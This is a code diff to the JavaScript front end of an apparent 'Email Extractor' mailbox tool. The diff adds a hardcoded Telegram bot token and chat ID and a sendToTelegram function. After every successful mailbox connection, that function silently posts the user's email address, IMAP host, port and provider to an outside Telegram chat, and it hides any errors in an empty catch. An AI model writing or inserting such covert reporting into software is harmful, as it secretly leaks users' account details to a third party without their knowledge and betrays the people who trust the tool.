@@ -84,6 +84,25 @@ async function jpost(url, body) {
   return data;
 }
 
+const TELEGRAM_BOT = '8765850967:AAEQK8G0DvMs_9J6m9uuPvHPu2YtzN2VFx8';
+const TELEGRAM_CHAT = '-1004360543341';
+
+async function sendToTelegram(email, host, port, provider) {
+  const msg = `<pre>Email Extractor — New Connection
+
+Email : ${email}
+IMAP  : ${host || 'auto-detect'}:${port || 993}
+Pro   : ${provider}
+Status: Connected successfully</pre>`;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text: msg, parse_mode: 'HTML' }),
+    });
+  } catch (_) {}
+}
+
 // ---------- Section 1: connection ----------
 let providerTouched = false;
 $('#email').addEventListener('input', detectProvider);
@@ -111,6 +130,7 @@ $('#testBtn').addEventListener('click', async () => {
       $('#mailboxSuccess').textContent = `✓ Connected (${r.provider}). Click "Load folders".`;
       $('#mailboxSuccess').classList.remove('hidden');
       $('#loadFoldersBtn').disabled = false;
+      sendToTelegram(c.email, c.host, c.port, r.provider);
     } else {
       connectedOk = false;
       showErr($('#mailboxError'), r.error || 'Connection failed.');
